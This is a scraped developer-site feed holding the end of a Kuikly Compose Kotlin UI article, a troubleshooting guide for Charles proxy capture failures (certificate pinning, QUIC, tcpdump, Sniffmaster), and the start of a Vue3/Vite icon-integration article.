    modifier = Modifier
        .rotate(rotateAnim)
        .clickable { expanded = !expanded }
)
</code></pre>
<h3 data-id="heading-7">3. 真实业务场景示例</h3>
<p>下面是一个完整的用户资料页面示例，展示了 Kuikly Compose 在实际业务中的应用：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Page(<span class="hljs-string">"ProfilePage"</span>)</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProfilePage</span> : <span class="hljs-type">ComposeContainer</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">willInit</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.willInit()
        setContent {
            MaterialTheme {
                Scaffold(
                    topBar = {
                        TopAppBar(
                            title = { Text(<span class="hljs-string">"我的主页"</span>) },
                            actions = {
                                IconButton(onClick = { <span class="hljs-comment">/* 设置操作 */</span> }) {
                                    Icon(Icons.Default.Settings, <span class="hljs-string">"设置"</span>)
                                }
                            }
                        )
                    }
                ) { innerPadding -&gt;
                    LazyColumn(contentPadding = innerPadding) {
                        <span class="hljs-comment">// 用户头像部分</span>
                        item {
                            Box(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(vertical = <span class="hljs-number">24.</span>dp),
                                contentAlignment = Alignment.Center
                            ) {
                                Image(
                                    painter = rememberImagePainter(
                                        <span class="hljs-string">"https://example.com/avatar.jpg"</span>
                                    ),
                                    contentDescription = <span class="hljs-string">"用户头像"</span>,
                                    modifier = Modifier
                                        .size(<span class="hljs-number">120.</span>dp)
                                        .clip(CircleShape)
                                        .border(<span class="hljs-number">2.</span>dp, Color.Gray, CircleShape)
                                )
                            }
                        }
                        
                        <span class="hljs-comment">// 用户信息部分</span>
                        item {
                            <span class="hljs-keyword">var</span> userName <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-string">"Kuikly User"</span>) }
                            <span class="hljs-keyword">var</span> bio <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-string">"热爱跨端开发的开发者"</span>) }
                            
                            Column(modifier = Modifier.padding(horizontal = <span class="hljs-number">16.</span>dp)) {
                                Text(
                                    text = userName,
                                    style = MaterialTheme.typography.h5,
                                    modifier = Modifier.padding(bottom = <span class="hljs-number">8.</span>dp)
                                )
                                
                                Text(
                                    text = bio,
                                    style = MaterialTheme.typography.body1,
                                    color = Color.Gray
                                )
                                
                                <span class="hljs-comment">// 交互按钮</span>
                                Button(
                                    onClick = { 
                                        userName = <span class="hljs-string">"欢迎使用 Kuikly!"</span>
                                        bio = <span class="hljs-string">"体验真正的跨端开发"</span>
                                    },
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .padding(vertical = <span class="hljs-number">16.</span>dp)
                                ) {
                                    Text(<span class="hljs-string">"更新资料"</span>)
                                }
                            }
                        }
                        
                        <span class="hljs-comment">// 功能列表</span>
                        item {
                            <span class="hljs-keyword">val</span> menuItems = listOf(
                                <span class="hljs-string">"我的作品"</span>,
                                <span class="hljs-string">"收藏记录"</span>, 
                                <span class="hljs-string">"学习轨迹"</span>,
                                <span class="hljs-string">"系统设置"</span>
                            )
                            
                            LazyColumn {
                                items(menuItems) { item -&gt;
                                    Card(
                                        modifier = Modifier
                                            .fillMaxWidth()
                                            .padding(horizontal = <span class="hljs-number">16.</span>dp, vertical = <span class="hljs-number">4.</span>dp)
                                            .clickable { <span class="hljs-comment">/* 处理点击 */</span> },
                                        elevation = <span class="hljs-number">2.</span>dp
                                    ) {
                                        Row(
                                            modifier = Modifier.padding(<span class="hljs-number">16.</span>dp),
                                            verticalAlignment = Alignment.CenterVertically
                                        ) {
                                            Text(
                                                text = item,
                                                modifier = Modifier.weight(<span class="hljs-number">1f</span>)
                                            )
                                            Icon(
                                                Icons.Default.ChevronRight,
                                                contentDescription = <span class="hljs-string">"箭头"</span>
                                            )
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
</code></pre>
<p>这个示例充分展示了 Kuikly Compose 的能力：</p>
<ul>
<li>✅ <strong>复杂布局</strong>：使用 <code>Scaffold</code>、<code>LazyColumn</code> 等高级布局</li>
<li>✅ <strong>状态管理</strong>：响应式状态驱动 UI 更新</li>
<li>✅ <strong>手势交互</strong>：支持点击等用户交互</li>
<li>✅ <strong>样式主题</strong>：完整的 Material Design 支持</li>
<li>✅ <strong>性能优化</strong>：使用 <code>LazyColumn</code> 处理长列表</li>
</ul>
<h2 data-id="heading-8">四、实战选择指南</h2>
<h3 data-id="heading-9">选择 Jetpack Compose，如果：</h3>
<ul>
<li>你的项目<strong>仅面向 Android 平台</strong></li>
<li>需要深度集成 Android 特定功能</li>
<li>追求最前沿的 Android UI 技术生态</li>
</ul>
<h3 data-id="heading-10">选择 Kuikly Compose，如果：</h3>
<ul>
<li>业务需要覆盖 <strong>Android、iOS、鸿蒙等多个平台</strong></li>
<li>希望用 <strong>统一技术栈</strong> 降低学习和维护成本</li>
<li>追求<strong>极致原生性能</strong>和<strong>无缝原生体验</strong></li>
<li>需要与现有原生代码深度集成</li>
<li>对<strong>动态化</strong>有潜在需求</li>
<li><strong>特别是</strong>需要快速、高质量完成鸿蒙应用适配</li>
</ul>
<h2 data-id="heading-11">五、未来展望</h2>
<p>Kuikly Compose 代表着 Kotlin 跨端开发的未来方向。随着项目的持续发展，我们期待看到：</p>
<ol>
<li><strong>更广泛的平台支持</strong>：包括 Desktop、更多小程序平台</li>
<li><strong>更完善的组件生态</strong>：覆盖所有 Jetpack Compose 组件</li>
<li><strong>更强大的工具链</strong>：开发体验的持续优化</li>
<li><strong>更丰富的生态系统</strong>：第三方库和插件支持</li>
</ol>
<h2 data-id="heading-12">结语</h2>
<p>Kuikly Compose 让 Compose 的优雅语法真正突破了 Android 的边界，为开发者开启了一扇通往"Kotlin 全栈跨端"的大门。无论你是现有的 Compose 开发者想要扩展技能边界，还是正在为多平台开发的技术选型而苦恼，Kuikly Compose 都值得你深入了解和尝试。</p>
<p><strong>开始探索：</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fkuikly.dev" target="_blank" title="https://kuikly.dev" ref="nofollow noopener noreferrer">Kuikly Compose 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkuikly%2Fkuikly-compose" target="_blank" title="https://github.com/kuikly/kuikly-compose" ref="nofollow noopener noreferrer">Kuikly GitHub 仓库</a> - 查看最新示例和源码</li>
</ul>
<p>拥抱 Kuikly Compose，体验"一次编写，处处原生"的真正跨端开发魅力！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Charles 抓不到包怎么办？从 HTTPS 分析到 TCP 抓包的全流程排查指南]]></title>    <link>https://juejin.cn/post/7575910333400645686</link>    <guid>https://juejin.cn/post/7575910333400645686</guid>    <pubDate>2025-11-24T07:39:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575910333400645686" data-draft-id="7576026767371321363" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Charles 抓不到包怎么办？从 HTTPS 分析到 TCP 抓包的全流程排查指南"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T07:39:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="iOS开发上架哦"/> <meta itemprop="url" content="https://juejin.cn/user/3336394949004844"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Charles 抓不到包怎么办？从 HTTPS 分析到 TCP 抓包的全流程排查指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3336394949004844/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    iOS开发上架哦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T07:39:13.000Z" title="Mon Nov 24 2025 07:39:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在日常开发和移动端调试中，<strong>Charles</strong> 是最常使用的代理抓包工具之一。但只要涉及 iOS、HTTPS、证书校验、QUIC 或应用侧特殊网络逻辑，Charles 偶尔会出现“完全抓不到包”的情况。明明已经设置了 Wi-Fi 代理，也安装了证书，可就是不出现任何流量——这是很多工程师最常见的抓包难题。</p>
<p>本文从工程角度深入分析 “<strong>Charles 抓不到包怎么办？</strong>”，拆解常见成因、系统排查方式，以及代理无效时如何通过Sniffmaster工具补齐证据</p>
<hr/>
<h2 data-id="heading-0">一、为什么 Charles 会抓不到包？（实际工程中出现最多的五个原因）</h2>
<h3 data-id="heading-1"><strong>HTTPS 证书未被系统信任或被替换</strong></h3>
<p>典型表现：</p>
<ul>
<li>只有 CONNECT，没有明文 HTTPS</li>
<li>App 报“证书不可信”</li>
</ul>
<p>这通常来自：</p>
<ul>
<li>证书未信任</li>
<li>Wi-Fi 或 VPN 注入中间证书</li>
<li>ATS 冲突导致握手失败</li>
</ul>
<hr/>
<h3 data-id="heading-2"><strong>App 启用了证书 Pinning</strong></h3>
<p>这是 iOS 抓包失败的最高频原因。</p>
<p>表现：</p>
<ul>
<li>Safari 能抓</li>
<li>Charles 能抓网页</li>
<li>但 App 完全没有流量</li>
</ul>
<p>说明 App 拒绝代理证书。</p>
<hr/>
<h3 data-id="heading-3"><strong>部分域名走 QUIC（HTTP/3）绕过代理</strong></h3>
<p>Charles 基于 TCP 代理，而 QUIC 走的是 UDP，所以：</p>
<ul>
<li>QUIC 流量不会被代理截获</li>
<li>视频类、海外接口尤其常见</li>
<li>HTTP/3 开启后抓包直接失效</li>
</ul>
<hr/>
<h3 data-id="heading-4"><strong>App 走了自定义网络栈或私有协议</strong></h3>
<p>例如：</p>
<ul>
<li>TCP 二进制协议</li>
<li>WebSocket</li>
<li>内嵌 SDK 的私有栈</li>
</ul>
<p>这些不会走系统代理，Charles 无法看到。</p>
<hr/>
<h3 data-id="heading-5"><strong>公司网络环境导致流量劫持</strong></h3>
<p>例如：</p>
<ul>
<li>企业 Wi-Fi 替换证书链</li>
<li>强制网关代理</li>
<li>安全系统阻断 TLS 中间人行为</li>
</ul>
<p>导致 Charles 无法正常建立解密链路。</p>
<hr/>
<h2 data-id="heading-6">二、Charles 抓不到包的排查步骤（工程团队可直接复用）</h2>
<p>下面的流程可直接用作团队抓包 SOP。</p>
<hr/>
<h3 data-id="heading-7"><strong>① 检查代理与证书设置（基础排查）</strong></h3>
<p>检查：</p>
<ul>
<li>Charles 是否开启 macOS 代理</li>
<li>证书是否安装并信任</li>
<li>端口是否被其他软件占用</li>
<li>Charles 是否启用了 SSL Proxying</li>
</ul>
<p>若 HTTPS 一条不出现 → 不是业务问题，是证书链/网络问题。</p>
<hr/>
<h3 data-id="heading-8"><strong>② 验证是否为证书 Pinning</strong></h3>
<p>判断方式：</p>
<ul>
<li>Safari 能抓包</li>
<li>App 抓不到包</li>
<li>Charles 面板始终干净</li>
</ul>
<p>这说明 App 内有 pinning。</p>
<p>继续依赖 Charles 无意义，必须以底层方式补抓。</p>
<hr/>
<h3 data-id="heading-9"><strong>③ 排查是否为 QUIC / HTTP3 导致</strong></h3>
<p>QUIC 是代理抓包失败的重要来源。</p>
<p>测试方法：</p>
<ul>
<li>强制关闭 HTTP/3</li>
<li>用移动网络（4G/5G）重新测试</li>
</ul>
<p>若关闭后能抓 → 即为 QUIC 绕过。</p>
<hr/>
<h3 data-id="heading-10"><strong>④ 看服务器端是否收到请求（确认链路）</strong></h3>
<p>使用 tcpdump 抓后端：</p>
<pre><code class="hljs language-arduino" lang="arduino">sudo tcpdump -i any port <span class="hljs-number">443</span> -s <span class="hljs-number">0</span> -w server.pcap
</code></pre>
<ul>
<li>若服务端没有握手 → APP 本地就失败</li>
<li>若有 TLS Alert → 证书链异常</li>
</ul>
<p>这一步非常关键。</p>
<hr/>
<h2 data-id="heading-11">三、当 Charles 完全抓不到包时，就要用“补抓工具”</h2>
<p>也就是解决代理彻底失效场景的方式。</p>
<hr/>
<h2 data-id="heading-12"><strong>抓包大师（Sniffmaster）如何补充 Charles 无法完成的环节？</strong></h2>
<h3 data-id="heading-13"><strong>Sniffmaster 补充的技术能力：</strong></h3>
<ul>
<li>无需代理即可抓取 <strong>HTTP / HTTPS / TCP / UDP</strong></li>
<li>按 <strong>App / 域名</strong> 过滤，极大减少噪音</li>
<li>自动识别 HTTP、HTTPS、mdns、自定义协议</li>
<li>查看 TCP 数据流（文本、十六进制、二进制）</li>
<li>支持 JavaScript 拦截器修改请求/响应</li>
<li>支持导出 <strong>pcap 文件</strong>（可在 Wireshark 中继续分析）</li>
<li>支持 Windows/macOS/iOS 多平台</li>
</ul>
<h3 data-id="heading-14"><strong>尤其适合用于：</strong></h3>
<ul>
<li>Pinning 无法绕过</li>
<li>QUIC 走 UDP</li>
<li>自定义协议</li>
<li>系统代理被覆盖</li>
<li>Charles 完全无数据</li>
</ul>
<p>也就是说，Sniffmaster 补足了 Charles 的盲区。</p>
<hr/>
<h2 data-id="heading-15">四、补抓流程示例：Charles 抓不到 HTTPS 的真实场景</h2>
<p>某 App 在 Charles 下完全无 HTTPS 内容，排查如下：</p>
<ol>
<li>证书已信任 → 排除基础问题</li>
<li>Safari 可抓包 → 说明系统代理正常</li>
<li>APP 抓不到 → 怀疑 pinning</li>
<li>后端 tcpdump 无握手 → 流量未发出</li>
<li>使用 Sniffmaster 捕获流量 → 看到 TLS Alert: bad certificate</li>
<li>Wireshark 对比发现证书链被内部网关替换</li>
<li>更换网络 → 抓包恢复正常</li>
</ol>
<p>结论：并非 Charles 的问题，而是链路证书冲突。</p>
<p>这一类问题只能通过“补抓 + pcap 分析”定位。</p>
<hr/>
<h2 data-id="heading-16">Charles 抓不到包的真正解决方案是“分层抓包”</h2>






























<table><thead><tr><th>抓包类型</th><th>可用工具</th><th>适用场景</th></tr></thead><tbody><tr><td>代理抓包</td><td>Charles / Proxyman / Fiddler</td><td>HTTP/HTTPS 调试</td></tr><tr><td>TCP/TLS 分析</td><td>Wireshark / tcpdump</td><td>握手失败、链路确认</td></tr><tr><td>自动化</td><td>mitmproxy / pyshark</td><td>批量抓包、测试</td></tr><tr><td>补抓（绕过代理）</td><td><strong>抓包大师（Sniffmaster）</strong></td><td>Pinning、QUIC、自定义协议、系统代理失效</td></tr></tbody></table>
<p>真正完整的抓包体系必须多工具协同，而不是依赖 Charles 单独解决问题。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3 + Vite 系统中 SVG 图标和 Element Plus 图标的整合实战]]></title>    <link>https://juejin.cn/post/7575488180981678080</link>    <guid>https://juejin.cn/post/7575488180981678080</guid>    <pubDate>2025-11-24T06:39:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575488180981678080" data-draft-id="7575810396201648162" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3 + Vite 系统中 SVG 图标和 Element Plus 图标的整合实战"/> <meta itemprop="keywords" content="前端,Vue.js,JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T06:39:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码途进化论"/> <meta itemprop="url" content="https://juejin.cn/user/3633206105473182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3 + Vite 系统中 SVG 图标和 Element Plus 图标的整合实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3633206105473182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码途进化论
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:39:40.000Z" title="Mon Nov 24 2025 06:39:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、整合背景</h2>
<h3 data-id="heading-1">为什么需要整合 SVG 图标和 Element Plus 图标？</h3>
<p>在现代前端开发中，图标是 UI 界面不可缺少的一部分。在实际项目开发过程中，我们经常面临以下问题：</p>
<ol>
<li>
<p><strong>多源图标混用的困境</strong>：</p>
<ul>
<li>项目中可能存在自定义的 SVG 图标（如特定业务的图标）</li>
<li>同时需要使用 Element Plus 提供的通用 UI 图标</li>
<li>如何优雅地切换和统一管理这两类图标？</li>
</ul>
</li>
<li>
<p><strong>性能优化需求</strong>：</p>
<ul>
<li>SVG 图标通过 vite-plugin-svg-icons 可以自动合并为一个 symbol，减少 HTTP 请求</li>
<li>Element Plus 图标作为组件库的一部分，需要按需加载</li>
<li>如何实现既能充分利用各自的优势，又能保证应用性能？</li>
</ul>
</li>
<li>
<p><strong>开发体验提升</strong>：</p>
<ul>
<li>希望在代码中能够自动识别并正确使用这两类图标</li>
<li>需要提供一个图标选择器 UI，方便开发者动态选择图标</li>
<li>需要统一的 API 接口，避免不同类型图标的调用差异</li>
</ul>
</li>
<li>
<p><strong>系统动态配置需求</strong>：</p>
<ul>
<li>在系统配置界面中，允许管理员通过 UI 动态选择图标</li>
<li>需要搜索、过滤和预览图标的功能</li>
<li>选择的图标配置需要与后端系统进行持久化</li>
</ul>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ce5f4a58c084594991d84bfe2755357~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU6L-b5YyW6K66:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764571539&amp;x-signature=OilQkS2hZHpbdGl65hbqyT9m8EU%3D" alt="image.png" loading="lazy"/></p>
